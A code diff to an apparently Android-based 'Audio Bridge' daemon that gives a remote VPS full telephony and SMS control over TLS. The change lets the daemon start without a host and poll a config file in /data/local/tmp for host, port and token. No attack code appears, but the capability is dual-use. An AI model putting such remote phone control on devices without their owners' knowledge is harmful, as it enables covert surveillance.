@@ -1132,16 +1132,11 @@ int main(int argc, char** argv) {
         fclose(f);
     }
     
-    if(!g_host) {
-        fprintf(stderr, 
-            "Usage: %s --host <VPS_IP> [--port N] [--socket PATH] [--token TOKEN] [--daemon] [--check-server]\n\n"
-            "Audio Bridge v%d.%d.%d - Full telephony & SMS control (TLS Secured)\n"
-            "Server commands available via TLS control channel.\n",
-            argv[0], VERSION_MAJOR, VERSION_MINOR, VERSION_PATCH);
-        return 1;
-    }
-    
     if(check_server) {
+        if(!g_host) {
+            LOGE("--check-server requires --host");
+            return 1;
+        }
         LOGI("Checking TLS connection to %s:%d...", g_host, g_port);
         if(!tls_connect(g_host, g_port)) {
             LOGE("TLS Connection failed");
@@ -1170,7 +1165,11 @@ int main(int argc, char** argv) {
     LOGI("║     Audio Bridge v%d.%d.%d - Full Telephony & SMS Control    ║", 
          VERSION_MAJOR, VERSION_MINOR, VERSION_PATCH);
     LOGI("╚══════════════════════════════════════════════════════════════╝");
-    LOGI("Target: %s:%d", g_host, g_port);
+    if(g_host) {
+        LOGI("Target: %s:%d", g_host, g_port);
+    } else {
+        LOGI("No server configured yet. Waiting for config via WebUI...");
+    }
     LOGI("Device ID: %s", get_device_id().c_str());
     
     // Setup shared memory
@@ -1179,15 +1178,33 @@ int main(int argc, char** argv) {
         return 1;
     }
     
-    // Init JNI stub removed
-    // start unix socket server instead
-
-    
     // Start Unix socket server
     std::thread unix_thread(unix_socket_server_thread);
     
-    // Main connection loop
+    // Main connection loop - wait for config if no host set
     while(g_running) {
+        // Re-read config if host not set
+        if(!g_host) {
+            FILE* cf = fopen("/data/local/tmp/audio_bridge.conf", "r");
+            if(cf) {
+                char line[256];
+                while(fgets(line, sizeof(line), cf)) {
+                    char key[64], val[192];
+                    if(sscanf(line, "%63[^=]=%191[^\n]", key, val) == 2) {
+                        if(!strcmp(key, "HOST") && strlen(val) > 0) g_host = strdup(val);
+                        if(!strcmp(key, "PORT")) g_port = atoi(val);
+                        if(!strcmp(key, "TOKEN")) g_token = strdup(val);
+                    }
+                }
+                fclose(cf);
+            }
+            if(!g_host) {
+                sleep(5);
+                continue;
+            }
+            LOGI("Config loaded! Target: %s:%d", g_host, g_port);
+        }
+        
         g_connected = false;
         LOGI("Connecting to %s:%d (TLS)...", g_host, g_port);
         
